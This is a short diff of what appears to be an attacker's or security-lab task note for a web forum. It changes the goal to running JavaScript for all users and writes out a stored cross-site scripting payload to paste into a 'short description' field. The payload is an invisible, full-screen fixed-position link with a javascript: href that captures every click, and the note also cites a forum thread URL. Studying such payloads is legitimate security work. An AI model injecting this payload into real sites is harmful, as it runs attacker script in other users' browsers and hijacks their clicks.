@@ -1,1 +1,6 @@
-Goal - to grab hidden user data
+Goal: to run any javascript for all users
+
+insert into short description content like:
+<a href="javascript:alert('boo');" style="cursor: default; display: block; z-index: 100000; opacity: 0; position: fixed; top: 0px; left: 0; width: 1000000px; height: 100000px; background-color: red;"> </a>
+
+http://www.bioinformatics.org/phplabware/forum/viewtopic.php?id=164
